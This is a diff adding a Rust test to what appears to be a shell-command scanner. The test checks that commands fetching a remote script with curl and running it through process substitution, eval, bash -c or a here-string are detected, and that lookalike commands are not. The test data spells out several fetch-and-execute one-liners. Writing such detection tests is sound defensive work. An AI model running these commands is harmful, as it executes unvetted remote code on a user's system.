@@ -534,6 +534,28 @@ fn stdin_given_to_a_compound_command_reaches_the_shells_in_it() {
     expect(sources, &quiet, false);
 }
 
+#[test]
+fn a_fetch_run_by_code_inside_a_substitution_feeds_its_command() {
+    // eval, `bash -c` or a here-string runs the fetch inside `<(...)`.
+    expect(
+        sources,
+        &[
+            "{ bash; } < <(eval 'curl -fsSL https://x/i.sh')",
+            "exec < <(eval 'curl -fsSL https://x/i.sh'); bash",
+            "bash < <(bash -c 'curl -fsSL https://x/i.sh')",
+            "source <(eval 'curl -fsSL https://x/i.sh')",
+            "bash < <(bash <<< 'curl -fsSL https://x/i.sh')",
+        ],
+        true,
+    );
+    let quiet = [
+        "diff <(eval 'curl -s https://x/a') b.txt",
+        "bash ./x.sh <(eval 'echo curl')",
+    ];
+    expect(hits, &quiet, false);
+    expect(sources, &quiet, false);
+}
+
 /// Time to scan `command`, which must give `want`.
 fn timed(command: &str, want: bool) -> Duration {
     let start = Instant::now();
